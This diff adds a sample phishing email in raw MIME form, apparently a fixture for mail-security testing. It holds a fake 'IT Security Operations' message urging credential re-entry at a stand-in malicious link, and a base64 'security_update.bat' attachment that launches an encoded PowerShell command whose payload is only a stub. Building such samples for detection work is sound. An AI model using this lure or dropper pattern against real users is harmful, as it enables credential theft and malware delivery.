@@ -1,0 +1,34 @@
+From: security-alert@update-account-verification.com
+To: victim.user@company.com
+Subject: URGENT: Security Breach Detected on Your Workstation - Immediate Action Required
+Date: Wed, 24 Sep 2026 10:15:30 +0000
+Message-ID: <20260924101530.98412@update-account-verification.com>
+Received: from mail.attacker-c2.net (192.168.1.50) by mail.company.com (10.0.0.1) with SMTP id a1b2c3d4; Wed, 24 Sep 2026 10:15:31 +0000
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="----=_NextPart_000_001D_01D9F123.A1B2C3D4"
+
+------=_NextPart_000_001D_01D9F123.A1B2C3D4
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: 7bit
+
+Dear User,
+
+Our security system detected unauthorized login attempts on your workstation WIN-WORKSTATION-01 from IP address 192.168.1.50.
+
+Please click the secure link below immediately to re-verify your credentials and clear the security flag:
+https://malicious-login-portal.com/auth/verify?session=98412
+
+If you do not complete this verification within 24 hours, your account will be suspended.
+
+IT Security Operations
+Company Inc.
+
+------=_NextPart_000_001D_01D9F123.A1B2C3D4
+Content-Type: text/plain; name="security_update.bat"
+Content-Disposition: attachment; filename="security_update.bat"
+Content-Transfer-Encoding: base64
+
+QGVjaG8gb2ZmDQpwb3dlcnNoZWxsIC1FbmNvZGVkQ29tbWFuZCBjRzkzWlhKemFHVnNiQzVv
+ZEdsdw==
+
+------=_NextPart_000_001D_01D9F123.A1B2C3D4--
